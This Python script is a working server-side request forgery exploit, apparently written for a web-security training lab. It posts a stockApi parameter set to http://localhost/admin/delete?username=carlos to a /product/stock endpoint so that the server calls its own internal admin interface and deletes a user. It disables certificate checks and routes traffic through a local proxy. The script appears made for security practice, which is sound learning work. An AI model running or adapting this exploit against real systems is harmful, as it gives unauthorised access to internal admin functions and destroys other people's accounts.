#!/usr/bin/python3
import sys
import urllib3
import requests


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# this function delete user based on url parameter which username
def delete_carlos(url):
    # we identify the vulnerable endpoint which contain url parameter that talk with internal endpoint
    vulnerable_endpoint = '/product/stock'
    # this the payload we will send through the craft request to exploit the lab
    final_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    # the request parameter with the payload as a dic
    stock_api_parameter = {'stockApi': final_ssrf_payload}
    # send the request
    sending_request = requests.post(url + vulnerable_endpoint, data=stock_api_parameter, verify=False, proxies=proxies)
    # note that the request is accessed only login as admin so the redirect of the request will be 401 but the action done 

def exploit():
    if len(sys.argv) != 2:
        print("[-] Unexpected error occur")
        print("[*] Usage of the script is: {} <your url>".format(sys.argv[0]))
        exit(-1)
    url = sys.argv[1]
    print("[+] deleting carlos user.")
    delete_carlos(url)


if __name__ == "__main__":
    exploit()
